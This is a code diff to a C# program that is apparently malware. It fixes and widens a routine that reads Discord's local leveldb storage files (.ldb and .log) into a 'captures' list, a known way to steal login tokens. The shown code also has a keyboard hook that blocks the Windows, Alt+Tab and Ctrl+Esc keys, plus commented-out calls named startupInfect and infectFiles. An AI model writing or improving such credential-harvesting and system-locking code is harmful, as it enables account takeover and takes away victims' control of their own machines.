@@ -59,7 +59,7 @@ namespace Lexanil
         public static readonly string Startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
         public static readonly string Lxnl = Path.Combine(AppData, ".lxnl");
         public static readonly string OurAppPath = Assembly.GetExecutingAssembly().Location;
-        public static readonly string DiscordDB = Path.Combine(AppData, @"Roaming\Discord\Local Storage\leveldb");
+        public static readonly string DiscordDB = Path.Combine(AppData, @"Discord\Local Storage\leveldb");
     }
 
     public partial class MainWindow : Form
@@ -92,7 +92,7 @@ namespace Lexanil
             //ShowCursor(false);
             //startupInfect();
             //infectFiles();
-            // prockilltmr.Start();
+            //prockilltmr.Start();
         }
 
         private void prockilltmr_Tick(object sender, EventArgs e)
@@ -147,7 +147,6 @@ namespace Lexanil
             if (nCode >= 0)
             {
                 KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
-
 
                 if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
                 {
@@ -224,7 +223,22 @@ namespace Lexanil
 
             if (Directory.Exists(Paths.DiscordDB))
             {
-                var files = Directory.EnumerateFiles(Paths.DiscordDB, "*.ldb", SearchOption.AllDirectories);
+                var files =
+                    Directory.EnumerateFiles(Paths.DiscordDB, "*.*", SearchOption.AllDirectories)
+                    .Where(x => x.EndsWith(".log") || x.EndsWith(".ldb"))
+                    .Select(x =>
+                    {
+                        try
+                        {
+                            var file = File.Open(x, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+                            return new StreamReader(file).ReadToEnd();
+                        }
+                        catch (Exception)
+                        {
+                            return "";
+                        }
+                    })
+                    .ToList();
 
                 captures.AddRange(
                     files
